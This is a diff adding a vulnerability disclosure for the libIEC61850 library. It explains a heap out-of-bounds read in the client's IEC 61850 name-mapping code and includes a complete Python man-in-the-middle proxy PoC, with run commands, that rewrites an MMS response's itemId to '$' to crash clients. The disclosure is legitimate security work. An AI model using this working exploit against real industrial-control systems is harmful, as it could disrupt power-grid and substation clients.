@@ -1,0 +1,409 @@
+issue #599
+
+Summary
+A malicious MMS server, or an active MITM that modifies a legitimate server response, can crash libIEC61850 client applications by returning a malformed GetNamedVariableListAttributesResponse whose first domain-specific itemId is reduced to "$".
+
+In the affected code path, the client decodes the remote itemId into a heap string and later converts it into an IEC 61850 object reference. That conversion routine implicitly assumes the MMS name is already in an internal LN$FC$...-style layout and performs fixed-offset reads relative to the first $ separator without validating that the suffix is present.
+
+When itemId == "$", the decoded heap object is only two bytes long ("$\0"). The conversion routine still reads separator + 2, which is outside the allocated heap object and triggers an AddressSanitizer-detectable heap-buffer-overflow read.
+
+This issue is client-side, reachable through the normal protocol state machine, and reproducible with the official example client (examples/iec61850_client_example2) when a transparent proxy minimally patches a real GetNamedVariableListAttributesResponse on the wire.
+
+Version
+Branch: v1.6_develop and v1.6
+
+Root cause
+High-level explanation
+The root cause is a trust-boundary mismatch between two layers:
+
+The MMS response parser accepts a remote domain-specific itemId and stores it as a plain C string.
+The IEC 61850 mapping layer later treats that string as a trusted internal name layout and performs fixed-offset parsing around $FC$ without validating that the required suffix exists.
+In other words, the parser preserves the untrusted remote string, but the mapper assumes it already satisfies an internal invariant.
+
+Detailed analysis
+In parseNamedVariableAttributes(...), the response parser decodes the remote domainId and itemId directly from the incoming GetNamedVariableListAttributesResponse and stores them in a MmsVariableAccessSpecification entry. There is no format validation ensuring that the decoded itemId contains a valid IEC 61850-style $FC$... suffix before it is used later.
+
+Conceptually, the relevant logic is:
+
+itemId = mmsMsg_createStringFromAsnIdentifier(...domainspecific.itemId);
+accessSpec = MmsVariableAccessSpecification_createAlternateAccess(
+    domainId, itemId, arrayIdx, componentName);
+That means a malformed remote value such as "$" survives decoding and is propagated unchanged.
+
+Later, IedConnection_getDataSetDirectory(...) iterates over the returned variable specifications and converts each one into an IEC 61850 object reference.
+
+Conceptually, the conversion path is:
+
+dataSetEntry = MmsMapping_varAccessSpecToObjectReference(varSpec);
+LinkedList_add(dataSetDirectory, dataSetEntry);
+The vulnerable logic is in MmsMapping_varAccessSpecToObjectReference(...). The function:
+
+Locates the first $ with strchr.
+Computes output length as if the input definitely contains a valid $FC$... tail.
+Skips forward by four bytes (separator + 4) to continue copying the remainder.
+Later copies the two FC characters by reading separator + 1 and separator + 2.
+A simplified representation of the vulnerable logic is:
+
+separator = strchr(itemId, '$');
+itemIdLen = strlen(itemId);
+newStringLen = ... + (itemIdLen - 2) + ...;
+currentPos = separator + 4;
+...
+fc0 = *(separator + 1);
+fc1 = *(separator + 2);
+This is only safe if itemId actually has the expected structure.
+
+For the malicious value:
+
+itemId = "$"
+heap object = ['$', '\0']
+length = 1
+separator == itemId
+The consequences are:
+
+separator + 1 points to the string terminator.
+separator + 2 points past the end of the allocated heap object.
+The fixed-offset FC read therefore becomes an out-of-bounds heap read.
+
+
+PoC
+
+#!/usr/bin/env python3
+
+import argparse
+import selectors
+import socket
+
+
+def decode_len(buf, pos):
+    if pos >= len(buf):
+        raise ValueError("length out of range")
+
+    first = buf[pos]
+
+    if first < 0x80:
+        return first, 1
+
+    octets = first & 0x7F
+
+    if octets == 0 or octets > 4 or (pos + 1 + octets) > len(buf):
+        raise ValueError("invalid BER length")
+
+    value = 0
+    for idx in range(octets):
+        value = (value << 8) | buf[pos + 1 + idx]
+
+    return value, 1 + octets
+
+
+def encode_len(value):
+    if value < 0x80:
+        return bytes([value])
+    if value <= 0xFF:
+        return b"\x81" + bytes([value])
+    if value <= 0xFFFF:
+        return b"\x82" + value.to_bytes(2, "big")
+    if value <= 0xFFFFFF:
+        return b"\x83" + value.to_bytes(3, "big")
+    if value <= 0xFFFFFFFF:
+        return b"\x84" + value.to_bytes(4, "big")
+    raise ValueError("BER length too large")
+
+
+def tlv(tag, value):
+    return bytes([tag]) + encode_len(len(value)) + value
+
+
+def parse_tlv(buf, pos, end):
+    if pos >= end:
+        raise ValueError("tlv start out of range")
+
+    tag = buf[pos]
+    length, length_size = decode_len(buf, pos + 1)
+    header_end = pos + 1 + length_size
+    value_end = header_end + length
+
+    if value_end > end:
+        raise ValueError("tlv exceeds container")
+
+    return {
+        "tag": tag,
+        "start": pos,
+        "header_end": header_end,
+        "value_start": header_end,
+        "value_end": value_end,
+        "end": value_end,
+        "value": buf[header_end:value_end],
+        "raw": buf[pos:value_end],
+    }
+
+
+def is_get_nvl_dir_response(mms_pdu):
+    try:
+        outer = parse_tlv(mms_pdu, 0, len(mms_pdu))
+        if outer["tag"] != 0x61:
+            return False
+
+        seq = parse_tlv(outer["value"], 0, len(outer["value"]))
+        if seq["tag"] != 0x30:
+            return False
+
+        pos = 0
+        invoke = parse_tlv(seq["value"], pos, len(seq["value"]))
+        if invoke["tag"] != 0x02:
+            return False
+        pos = invoke["end"]
+
+        wrap0 = parse_tlv(seq["value"], pos, len(seq["value"]))
+        if wrap0["tag"] != 0xA0:
+            return False
+
+        service = parse_tlv(wrap0["value"], 0, len(wrap0["value"]))
+        if service["tag"] != 0xA1:
+            return False
+
+        service_pos = 0
+        first_child = parse_tlv(service["value"], service_pos, len(service["value"]))
+        service_pos = first_child["end"]
+
+        second_child = parse_tlv(service["value"], service_pos, len(service["value"]))
+        if second_child["tag"] != 0xAC:
+            return False
+
+        ac_pos = 0
+        ac_first = parse_tlv(second_child["value"], ac_pos, len(second_child["value"]))
+        ac_pos = ac_first["end"]
+        ac_second = parse_tlv(second_child["value"], ac_pos, len(second_child["value"]))
+        if ac_second["tag"] != 0xA1:
+            return False
+
+        member = parse_tlv(ac_second["value"], 0, len(ac_second["value"]))
+        return member["tag"] == 0x30
+    except Exception:
+        return False
+
+
+def patch_first_member_item_id(mms_pdu):
+    outer = parse_tlv(mms_pdu, 0, len(mms_pdu))
+    seq = parse_tlv(outer["value"], 0, len(outer["value"]))
+
+    seq_pos = 0
+    invoke = parse_tlv(seq["value"], seq_pos, len(seq["value"]))
+    seq_pos = invoke["end"]
+
+    wrap0 = parse_tlv(seq["value"], seq_pos, len(seq["value"]))
+    service = parse_tlv(wrap0["value"], 0, len(wrap0["value"]))
+
+    service_pos = 0
+    service_first = parse_tlv(service["value"], service_pos, len(service["value"]))
+    service_pos = service_first["end"]
+    ac_tlv = parse_tlv(service["value"], service_pos, len(service["value"]))
+
+    ac_pos = 0
+    ac_first = parse_tlv(ac_tlv["value"], ac_pos, len(ac_tlv["value"]))
+    ac_pos = ac_first["end"]
+    entries_tlv = parse_tlv(ac_tlv["value"], ac_pos, len(ac_tlv["value"]))
+
+    member = parse_tlv(entries_tlv["value"], 0, len(entries_tlv["value"]))
+    member_tail = entries_tlv["value"][member["end"]:]
+
+    member_pos = 0
+    varspec = parse_tlv(member["value"], member_pos, len(member["value"]))
+    member_pos = varspec["end"]
+    trailing_member = member["value"][member_pos:]
+
+    name_tlv = parse_tlv(varspec["value"], 0, len(varspec["value"]))
+    name_pos = 0
+    domain_tlv = parse_tlv(name_tlv["value"], name_pos, len(name_tlv["value"]))
+    name_pos = domain_tlv["end"]
+    item_tlv = parse_tlv(name_tlv["value"], name_pos, len(name_tlv["value"]))
+    name_pos = item_tlv["end"]
+    name_tail = name_tlv["value"][name_pos:]
+
+    patched_item = tlv(item_tlv["tag"], b"$")
+    rebuilt_name = tlv(name_tlv["tag"], domain_tlv["raw"] + patched_item + name_tail)
+    rebuilt_varspec = tlv(varspec["tag"], rebuilt_name)
+    rebuilt_member = tlv(member["tag"], rebuilt_varspec + trailing_member)
+    rebuilt_entries = tlv(entries_tlv["tag"], rebuilt_member + member_tail)
+    rebuilt_ac = tlv(ac_tlv["tag"], ac_first["raw"] + rebuilt_entries)
+    rebuilt_service = tlv(service["tag"], service_first["raw"] + rebuilt_ac)
+    rebuilt_wrap0 = tlv(wrap0["tag"], rebuilt_service)
+    rebuilt_seq = tlv(seq["tag"], invoke["raw"] + rebuilt_wrap0)
+    rebuilt_outer = tlv(outer["tag"], rebuilt_seq)
+
+    return rebuilt_outer
+
+
+def patch_frame(frame):
+    if len(frame) < 12:
+        return frame, False
+
+    if frame[0] != 0x03:
+        return frame, False
+
+    if frame[4:7] != b"\x02\xf0\x80":
+        return frame, False
+
+    if frame[7:11] != b"\x01\x00\x01\x00":
+        return frame, False
+
+    mms_pdu = frame[11:]
+
+    if not is_get_nvl_dir_response(mms_pdu):
+        return frame, False
+
+    patched_mms_pdu = patch_first_member_item_id(mms_pdu)
+    patched = bytearray(frame[:11] + patched_mms_pdu)
+
+    tpkt_len = len(patched)
+    patched[2] = (tpkt_len >> 8) & 0xFF
+    patched[3] = tpkt_len & 0xFF
+
+    return bytes(patched), True
+
+
+class Endpoint:
+    def __init__(self, sock, name):
+        self.sock = sock
+        self.name = name
+        self.peer = None
+        self.inbuf = bytearray()
+        self.closed = False
+
+
+def close_endpoint(selector, endpoint):
+    if endpoint.closed:
+        return
+
+    endpoint.closed = True
+
+    try:
+        selector.unregister(endpoint.sock)
+    except Exception:
+        pass
+
+    try:
+        endpoint.sock.shutdown(socket.SHUT_RDWR)
+    except Exception:
+        pass
+
+    try:
+        endpoint.sock.close()
+    except Exception:
+        pass
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Transparent TPKT proxy that patches the first GetNamedVariableListAttributesResponse itemId to '$'"
+    )
+    parser.add_argument("--listen-host", default="127.0.0.1")
+    parser.add_argument("--listen-port", type=int, required=True)
+    parser.add_argument("--target-host", default="127.0.0.1")
+    parser.add_argument("--target-port", type=int, required=True)
+    parser.add_argument("--verbose", action="store_true")
+    args = parser.parse_args()
+
+    lsock = socket.socket(socket.AF_INET, socket.SOL_SOCKET)
+    lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    lsock.bind((args.listen_host, args.listen_port))
+    lsock.listen(1)
+
+    print(
+        f"[proxy] listening on {args.listen_host}:{args.listen_port} -> {args.target_host}:{args.target_port}",
+        flush=True,
+    )
+
+    client_sock, client_addr = lsock.accept()
+    print(f"[proxy] client connected from {client_addr[0]}:{client_addr[1]}", flush=True)
+
+    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_sock.connect((args.target_host, args.target_port))
+    print("[proxy] upstream connected", flush=True)
+
+    client_sock.setblocking(False)
+    server_sock.setblocking(False)
+    lsock.close()
+
+    client = Endpoint(client_sock, "client->server")
+    server = Endpoint(server_sock, "server->client")
+    client.peer = server
+    server.peer = client
+
+    selector = selectors.DefaultSelector()
+    selector.register(client.sock, selectors.EVENT_READ, client)
+    selector.register(server.sock, selectors.EVENT_READ, server)
+
+    patched = False
+
+    while not client.closed and not server.closed:
+        events = selector.select(timeout=1.0)
+
+        if not events:
+            continue
+
+        for key, _ in events:
+            endpoint = key.data
+
+            try:
+                data = endpoint.sock.recv(65535)
+            except BlockingIOError:
+                continue
+
+            if not data:
+                close_endpoint(selector, endpoint)
+                close_endpoint(selector, endpoint.peer)
+                break
+
+            endpoint.inbuf.extend(data)
+
+            while True:
+                if len(endpoint.inbuf) < 4:
+                    break
+
+                if endpoint.inbuf[0] != 0x03:
+                    raise ValueError("non-TPKT data encountered")
+
+                frame_len = (endpoint.inbuf[2] << 8) | endpoint.inbuf[3]
+
+                if frame_len < 4:
+                    raise ValueError("invalid TPKT length")
+
+                if len(endpoint.inbuf) < frame_len:
+                    break
+
+                frame = bytes(endpoint.inbuf[:frame_len])
+                del endpoint.inbuf[:frame_len]
+
+                if endpoint is server and not patched:
+                    frame, was_patched = patch_frame(frame)
+                    if was_patched:
+                        patched = True
+                        print(
+                            f"[proxy] patched first GetNamedVariableListAttributesResponse new_tpkt_len={len(frame)}",
+                            flush=True,
+                        )
+
+                if args.verbose:
+                    print(f"[proxy] forwarding {endpoint.name} frame len={len(frame)}", flush=True)
+
+                endpoint.peer.sock.sendall(frame)
+
+
+if __name__ == "__main__":
+    main()
+
+
+Run commands
+Terminal 1: start the official server
+./build-debug/examples/server_example_basic_io/server_example_basic_io 18171
+Terminal 2: start the transparent proxy
+python3 proxy.py --listen-port 28177 --target-port 18171 --verbose
+Terminal 3: start the official client against the proxy
+./build-asan/examples/iec61850_client_example2/iec61850_client_example2 127.0.0.1 28177
+Proxy behavior
+The proxy only patches the first real GetNamedVariableListAttributesResponse and logs a message like:
+
+[proxy] patched first GetNamedVariableListAttributesResponse new_tpkt_len=210
+
